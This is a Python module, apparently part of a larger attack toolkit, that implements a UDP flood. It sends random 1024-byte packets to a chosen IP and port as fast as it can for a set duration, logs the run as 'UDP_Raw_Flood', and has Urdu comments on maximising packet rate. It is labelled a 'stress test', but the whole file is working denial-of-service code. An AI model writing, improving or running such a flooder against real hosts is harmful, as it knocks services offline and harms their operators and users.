# modules/udp_raw.py
import socket
import random
import time
from utils.colors import Colors
from utils.logger import log_attack

def start_udp_raw(ip, port, duration, spoof=False):
    log_attack("UDP_Raw_Flood", ip, port, duration)
    timeout = time.time() + duration
    sent = 0
    
    print(Colors.info(f"Starting High-Speed UDP Raw Stress Test on {ip}:{port}"))
    
    # پرفارمنس بڑھانے کے لیے پے لوڈ بفر کو پہلے ہی میموری میں رکھ لیا
    payload = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() < timeout:
        try:
            sock.sendto(payload, (ip, port))
            sent += 1
            if sent % 500 == 0: # زیادہ پرنٹ کرنے سے اسپیڈ کم ہوتی ہے، اس لیے ہر 500 پیکٹ بعد اپڈیٹ ہوگا
                print(f"\r{Colors.success(f'UDP Packets Sent: {sent}')}", end="")
        except Exception as e:
            print(f"\n{Colors.error(f'Error: {e}')}")
            break
            
    print(f"\n\n{Colors.success(f'UDP Test Finished. Total: {sent}')}")
    time.sleep(2)
  
